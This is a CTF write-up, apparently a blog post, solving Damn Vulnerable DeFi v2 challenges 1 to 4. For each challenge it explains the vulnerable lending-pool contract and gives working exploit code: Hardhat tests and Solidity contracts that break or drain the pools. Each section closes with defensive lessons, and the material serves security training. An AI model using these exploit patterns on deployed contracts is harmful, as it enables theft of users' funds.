@@ -1,0 +1,366 @@
+# Damn Vulnerable DeFi V2 - Part #1: Setup And Challenges 1 To 4
+
+<p className="text-xs text-right">November 13, 2021 by [patrickd](/about#patrickd)</p>
+
+import { Callout } from 'nextra/components'
+
+[@tinchoabbate][0] has recently released an [updated version of the Damn Vulnerable DeFi][1], modernized with current Solidity version, tooling and more levels. After having recently completed [OpenZeppelin's Ethernaut][2] and [smarx's Capture the Ether][3] it's finally time to tackle, what I expect to be the most challenging CTF of these.
+
+<Callout type="warning">
+  *Spoilers!* A This is a writeup and spoiling all of the fun lies in its nature.
+</Callout>
+
+[0]: https://twitter.com/tinchoabbate
+[1]: https://www.damnvulnerabledefi.xyz/v2-release.html
+[2]: https://ethernaut.openzeppelin.com/
+[3]: https://capturetheether.com/
+
+---
+
+## Setup
+
+While the other CTFs so far could basically be played using the Browser only (eg. by mostly making use of [Remix][4]) this one appears to need some local setup, so we'll start from a fresh Ubuntu box.
+
+import { Steps } from 'nextra/components'
+ 
+<Steps>
+### Clone the repository
+`git clone https://github.com/tinchoabbate/damn-vulnerable-defi.git`  
+
+### Enter the repository
+`cd damn-vulnerable-defi/`  
+
+### Check out the latest version
+`git checkout v2.0.0`  
+
+### Install NodeJS version manager
+`curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh | bash`  
+
+<Callout type="info">
+  Restart your terminal so the next commands are available
+</Callout>
+
+### Install NodeJS v14
+`nvm install 14`  
+
+### Install yarn globally for current node version
+`npm install -g yarn`  
+
+### Install dependencies
+`yarn`  
+
+<Callout type="info">
+  Make sure to run this within the repository to install dependencies
+</Callout>
+
+</Steps>
+
+Right off the bat it's clear that, since this is all running locally, there's no highscore lists or any other sort of tracking. This is less of a test that you take and more of a practice book that you are given. You're free to cheat yourself (eg. by adjusting the success conditions), but its not like that'll do you any good. But most importantly, that also means there are no unexpected surprises here: No inconsistencies between what's actually deployed and the code that you're given - what you see is all there is, and that is great.
+
+[4]: https://remix.ethereum.org/
+
+---
+
+## Challenge #1 - Unstoppable
+
+> There's a lending pool with a million DVT tokens in balance, offering flash loans for free.
+>
+> If only there was a way to attack and stop the pool from offering flash loans ...
+>
+> You start with 100 DVT tokens in balance.
+
+In code review we often say, if you want to understand the code, first read the tests. Since all of these challenges seem to be setup, exploited and checked for success by tests, I think this is a good place to start.
+
+What we find in [unstoppable.challenge.js][5] is a very simple setup. A token "DamnValuableToken" (DVT) is created, of which 1000000 "ether" (== $1000000*10e18$ token) are deposited into [UnstoppableLender][6] (pool) contract, and 100 tokens are send to our attacker EOA account. Finally, a quick test is run using the [ReceiverUnstoppable][7] contract which takes a flash loan from UnstoppableLender and pays it back immediately.
+
+Looking at the UnstoppableLender contract, the first thing that immediately pops into my eyes is the fact that it's keeping track of the `poolBalance` instead of relying on checking its actual balance from the DVT token contract. This could lead to "accounting errors", when tokens are sent to the contract directly without using the `depositTokens()` function.
+
+```solidity filename="UnstoppableLender.sol" /poolBalance == balanceBefore/
+uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
+// Ensured by the protocol via the `depositTokens` function
+assert(poolBalance == balanceBefore);
+```
+
+And indeed, as we can see here (line 40): Before allowing to take a flash loan it always checks whether the actual token balance exactly matches the balance tracked within the `poolBalance` variable. So we should be able to break this contract simply by sending it one "unsolicited" DVT token.
+
+Now how to write the exploit? It seems that the setup step already gives us all of the javascript we'll be needing to write it, we basically just have to do some copy and pasting.
+
+```javascript filename="unstoppable.challenge.js" {5} copy
+it('Exploit', async function () {
+    // Make sure we interact with token contract as "attacker".
+    this.token.connect(attacker);
+    // Send 1 token to pool.
+    this.token.transfer(this.pool.address, 1);
+});
+```
+
+The first time we run `yarn run unstoppable` to check our solution, there'll be some more first-time setup going on (downloading various solc versions and compiling the contracts).
+
+<Callout type="info">
+  If you, like me at first, installed the newest nodejs version you might run into `Error: error:0308010C:digital envelope routines::unsupported`, `ERR_OSSL_EVP_UNSUPPORTED` errors. In that case you simply have to switch to nodejs v14 with `nvm install 14`, remove the `node_modules` folder and rerun `yarn` to re-install dependencies.
+</Callout>
+
+```bash
+ubuntu@damnsvulndefi:~/damn-vulnerable-defi$ yarn run unstoppable
+yarn run v1.22.17
+$ yarn hardhat test test/unstoppable/unstoppable.challenge.js
+$ /home/ubuntu/damn-vulnerable-defi/node_modules/.bin/hardhat test test/unstoppable/unstoppable.challenge.js
+
+
+  [Challenge] Unstoppable
+    ✓ Exploit
+
+
+  1 passing (810ms)
+
+Done in 1.85s.
+```
+
+Learning: Don't keep track of balances if you don't have to. And if you do, always assume that your balance might end up being inconsistent with the real one. In case of UnstoppableLender it would have been better to check the balance with `assert(poolBalance <= balanceBefore);{:solidity}`, allowing the actual balance to be larger than the accounted one.
+
+
+[5]: https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/test/unstoppable/unstoppable.challenge.js
+[6]: https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/contracts/unstoppable/UnstoppableLender.sol
+[7]: https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/contracts/unstoppable/ReceiverUnstoppable.sol
+[8]: https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/test/naive-receiver/naive-receiver.challenge.js
+[9]: https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/contracts/naive-receiver/NaiveReceiverLenderPool.sol
+[10]: https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/contracts/naive-receiver/FlashLoanReceiver.sol
+[11]: https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/test/truster/truster.challenge.js
+[12]: https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/contracts/truster/TrusterLenderPool.sol
+[13]: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/token/ERC20/ERC20.sol
+[14]: https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/test/side-entrance/side-entrance.challenge.js
+[15]: https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/contracts/side-entrance/SideEntranceLenderPool.sol
+
+---
+
+## Challenge #2 - Naive receiver
+
+>There's a lending pool offering quite expensive flash loans of Ether, which has 1000 ETH in balance.
+>
+>You also see that a user has deployed a contract with 10 ETH in balance, capable of interacting with the lending pool and receiving flash loans of ETH.
+>
+>Drain all ETH funds from the user's contract. Doing it in a single transaction is a big plus ;)
+
+From the description alone, I somewhat assume that the user's contract isn't properly checking that it's actually interacting with the flash loan contract, which would allow us to get back a loan that we've never given? And doing it within a single transaction likely requires writing an exploit contract instead of doing it from the javascript test suite.
+
+The [test setup](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/test/naive-receiver/naive-receiver.challenge.js) is quite similar to before, just this time it's not about tokens but ether and it's not us and the pool getting the initial balances but the pool and the user's flash loan receiving contract. It seems a bit strange that the user's EOA account isn't actually used to deploy the FlashLoanReceiver contract, maybe an oversight.
+
+The most interesting part here is the success condition: I initially assumed we had to drain the user's contract and obtain the ether into our attacker EOA account, but instead it expects that the pool ends up with the user's ether. So most likely we need to force the user's contract to take unsolicited flash loans and force them to pay high fees draining the contract's funds.
+
+And indeed, [NaiveReceiverLenderPool](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/contracts/naive-receiver/NaiveReceiverLenderPool.sol)'s `flashLoan()` function allows specifying a borrower instead of assuming the message sender is the borrower. And furthermore, [FlashLoanReceiver](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/contracts/naive-receiver/FlashLoanReceiver.sol) does not appear to have any checks on whether it actually "asked" for a flash loan in the first place.
+
+With the receiver contract having initial funds of 10 ether and each flash loan costing 1 ether, that means we need to force it to accept 10 flash loans in order to drain all of its funds. This also nicely explains why the challenge description makes it sound like there's extra points for doing it within a single transaction (from our own contract).
+
+But first, let's do it the easy way, let's trigger 10 flash loans in 10 separate transactions via javascript alone:
+
+```javascript filename="naive-receiver.challenge.js" copy
+it('Exploit', async function () {
+    // Make sure we interact with pool contract as "attacker".
+    this.pool.connect(attacker);
+    // Force the receiver to pay for 10 flash loans.
+    this.pool.flashLoan(this.receiver.address, 1);
+    this.pool.flashLoan(this.receiver.address, 2);
+    this.pool.flashLoan(this.receiver.address, 3);
+    this.pool.flashLoan(this.receiver.address, 4);
+    this.pool.flashLoan(this.receiver.address, 5);
+    this.pool.flashLoan(this.receiver.address, 6);
+    this.pool.flashLoan(this.receiver.address, 7);
+    this.pool.flashLoan(this.receiver.address, 8);
+    this.pool.flashLoan(this.receiver.address, 9);
+    this.pool.flashLoan(this.receiver.address, 10);
+});
+```
+
+That works, nice and easy. But let's get those extra points now, by putting the `flashLoan()` calls within a contract, allowing us to drain the funds within a single transaction:
+
+```solidity showLineNumbers filename="/contracts/naive-receiver/Exploit.sol" copy
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface INaiveReceiverLenderPool {
+    function flashLoan(address borrower, uint256 borrowAmount) external;
+}
+
+contract Exploit {
+    constructor(address _pool, address _receiver) {
+        INaiveReceiverLenderPool pool = INaiveReceiverLenderPool(_pool);
+        pool.flashLoan(_receiver, 1);
+        pool.flashLoan(_receiver, 2);
+        pool.flashLoan(_receiver, 3);
+        pool.flashLoan(_receiver, 4);
+        pool.flashLoan(_receiver, 5);
+        pool.flashLoan(_receiver, 6);
+        pool.flashLoan(_receiver, 7);
+        pool.flashLoan(_receiver, 8);
+        pool.flashLoan(_receiver, 9);
+        pool.flashLoan(_receiver, 10);
+    }
+}
+```
+
+Then by adjusting the test suite to deploy the Exploit contract, triggering its constructor:
+
+```javascript filename="naive-receiver.challenge.js" copy
+it('Exploit', async function () {
+    const ExploitFactory = await ethers.getContractFactory('Exploit', attacker);
+    // Run Exploit constructor.
+    await ExploitFactory.deploy(this.pool.address, this.receiver.address);
+});
+```
+
+Learning: It's not enough to make sure that your callbacks can only be called by certain whitelisted addresses, you also need to make sure you expected them to call in the first place.
+
+---
+
+## Challenge #3 - Truster
+
+>More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.
+>
+>Currently the pool has 1 million DVT tokens in balance. And you have nothing.
+>
+>But don't worry, you might be able to take them all from the pool. In a single transaction.
+
+The name seems to imply there's too much trusting going on here, so I expect some kind of permission/authentication issue.
+
+Starting with [truster.challenge.js](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/test/truster/truster.challenge.js) we can see that the same DVT tokens are back and all of the tokens are immediately and directly transferred into the pool, no deposit/add liquidity function this time. The success condition is, somehow transferring all of them to the attacker EOA account.
+
+There's only [TrusterLenderPool.sol](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/contracts/truster/TrusterLenderPool.sol) to look at this time. The first thing that seems out of place is the use of a low-level function call with userinput as calldata to any target address.
+
+So the question now is, what could that target be that could cause something bad to happen? A hint is basically directly above the functionCall(): `damnValuableToken.transfer(borrower, borrowAmount);{:solidity}` – it transfers the specified amount of tokens to the borrower – from whom? From the contract calling, because the ERC20 transfer function basically authenticates using `msg.sender`.
+
+We're allowed to make a functionCall just like that while being able to use the TrusterLenderPool as `msg.sender` and we could use it to give ourselves an ERC20 allowance in TrustLenderPools' name. But hold on, the borrower also needs to transfer back the tokens it received and ERC20 doesn't have callbacks allowing the receiver to react to a token transfer – this is the original intention of the functionCall after all, to tell the borrower contract that it should now make use of the loan and pay it back once finished. So can we somehow send the tokens back on time or prevent receiving them in the first place?
+
+Well, how about we borrow an amount of 0 tokens? There appears to be no check whether we're borrowing anything at all, and as long as neither sender nor receiver are zero-addresses [OpenZeppelin's ERC20 implementation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.4/contracts/token/ERC20/ERC20.sol) doesn't seem to care about a transaction of 0 tokens either. In this case we can basically call the `flashLoan()` function without actually taking any loans but being able to call any function on any address in its name!
+
+We're again challenged to do it all within a single transaction, so let's build our borrowing exploit contract:
+
+```solidity showLineNumbers filename="/contracts/naive-receiver/TrusterExploit.sol" copy
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+
+interface ITrusterLenderPool {
+    function flashLoan(uint256 borrowAmount, address borrower, address target, bytes calldata data) external;
+}
+
+contract TrusterExploit {
+    constructor(address _pool, address _token, uint tokensInPool) {
+        ITrusterLenderPool pool = ITrusterLenderPool(_pool);
+        pool.flashLoan(
+            // We're not borrowing anything, we'd not be able to pay it back in time.
+            0,
+            // Nothing is being borrowed, so the the receiver doesn't matter much.
+            address(this),
+            // We make the pool call the token contract.
+            _token,
+            // We make the pool give this contract an allowance for all its tokens.
+            abi.encodeWithSignature("approve(address,uint256)", address(this), tokensInPool)
+        );
+        IERC20 token = IERC20(_token);
+        // Now this contract can transfer all of the tokens from the pool to the attacker EOA.
+        token.transferFrom(_pool, msg.sender, tokensInPool);
+    }
+}
+```
+
+And like before we adjust the test suite to deploy our Exploit contract:
+
+```javascript filename="truster.challenge.js" copy
+it('Exploit', async function () {
+    const ExploitFactory = await ethers.getContractFactory('TrusterExploit', attacker);
+    // Run Exploit constructor.
+    await ExploitFactory.deploy(this.pool.address, this.token.address, TOKENS_IN_POOL);
+});
+```
+
+<Callout type="info">
+  Whoops! At first, I was planning to call all of my contracts "Exploit.sol", assuming it's sufficient for each of them to be within separate directories but it turned out that they are all within the same namespace which is why I got `HardhatError: HH701: There are multiple artifacts for contract "Exploit", please use a fully qualified name.`. So in the end I had to rename `Exploit` to `TrusterExploit` to make it work.
+</Callout>
+
+Learning: A reentrancy-guard is no silver bullet to prevent bad things that can happen from making calls to other contracts! In this specific case, the biggest issue is allowing to specify a call-target that is different from the borrower contract. It would've been a lot saver to require the `msg.sender` to be both borrower and target, expecting the borrower to implement a specific interface and not allow arbitrary data to be passed through.
+
+Most importantly though, don't forget that when you make a call to another contract (eg. a token), that contract assumes that the message you are sending has been authenticated and is purposeful. You wouldn't let other people use your browser while you're still logged in everywhere, would you?
+
+---
+
+## Challenge #4 - Side entrance
+
+>A surprisingly simple lending pool allows anyone to deposit ETH, and withdraw it at any point in time.
+>
+>This very simple lending pool has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.
+>
+>You must take all ETH from the lending pool.
+
+I'm calling it now: Entrance, sounds like re-entrancy and side means re-entrancy not through the same function but through another!
+
+But first, let's look at the [tests](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/test/side-entrance/side-entrance.challenge.js) again. The setup is even more simple this time: There's one pool contract, 1000 ether instead of tokens, which are put into the pool via a `deposit()` function. The success conditions are that the pool has been drained of all ether and that the attacker EOA's balance is greater than at the start.
+
+And the first thing that stands out to me after my initial call is, that [SideEntranceLenderPool](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/contracts/side-entrance/SideEntranceLenderPool.sol) does indeed not make use of OpenZeppelin's ReentrancyGuard at all, although all previous contracts did.
+
+The `withdraw()` function makes an external call to the `msg.sender` but does so while making use of the checks-effects-interactions pattern (by first setting the balance to 0 and only then making the call) and is therefore not susceptible to reentrancy on its own.
+
+The interesting part lies in `flashLoan()` and how it checks that the loan has been paid back: It does so by ensuring the contract's overall balance stays the same – but what it does not, is checking the `balances` mapping. The sum of all balances within the mapping should always be equal (or less, since unsolicited ether can be forced into the contract) to the actual contract's balance. But the sum of balances should, beside of a flash loan being in progress, never be higher than the actual amount of ether available in the contract.
+
+This allows us to take a flash-loan and pay it into the pool contract via the deposit() function, where the deposit will be accredited to us. That's fine because the pool now thinks we have returned it since its balance is the same as before. After having done that we can simply withdraw all of the pool's funds, while all the other contributors to the pool are rekt.
+
+Again, we'll write an Exploit contract, but this time it needs to have a callback so we can't do it all within the constructor:
+
+```solidity showLineNumbers filename="/contracts/side-entrance/SideEntranceExploit.sol" copy
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface ISideEntranceLenderPool {
+    function deposit() external payable;
+    function withdraw() external;
+    function flashLoan(uint256 amount) external;
+}
+
+interface IFlashLoanEtherReceiver {
+    function execute() external payable;
+}
+
+contract SideEntranceExploit is IFlashLoanEtherReceiver {
+    ISideEntranceLenderPool immutable pool;
+    uint immutable etherInPool;
+    address payable immutable attacker = payable(msg.sender);
+    constructor(address _pool, uint _etherInPool) {
+        pool = ISideEntranceLenderPool(_pool);
+        etherInPool = _etherInPool;
+    }
+
+    // The function that starts the exploit.
+    function pwn() external {
+        // Borrow all of it, it's free after all!
+        pool.flashLoan(etherInPool);
+        // Withdraw our "loan" to this contract.
+        pool.withdraw();
+        // Give it all to our EOA account.
+        attacker.transfer(address(this).balance);
+    }
+
+    // The flashloan callback.
+    function execute() external payable override {
+        // Deposit the loan back into the pool, but under our name.
+        pool.deposit{value:msg.value}();
+    }
+
+    // Necessary for the withdrawal from the pool.
+    receive() external payable {}
+}
+```
+
+And the test now needs to start the exploit by calling `pwn()` after deployment:
+
+```javascript filename="side-entrance.challenge.js" copy
+it('Exploit', async function () {
+    const ExploitFactory = await ethers.getContractFactory('SideEntranceExploit', attacker);
+    // Run Exploit constructor.
+    const exploit = await ExploitFactory.deploy(this.pool.address, ETHER_IN_POOL);
+    await exploit.pwn();
+});
+```
+
+Learning: Even if you implement the checks-effects-interactions pattern properly within each individual function, you might still want to consider making use of a ReentrancyGuard if you're not sure that there might be a reentrancy possible by combining these functions in some manner. That would've been an easy fix here, although not cheap in regards to gas costs. Another solution would be to keep track of the sum of deposits and make sure that it's never higher than the actual contract balance.
+
+---
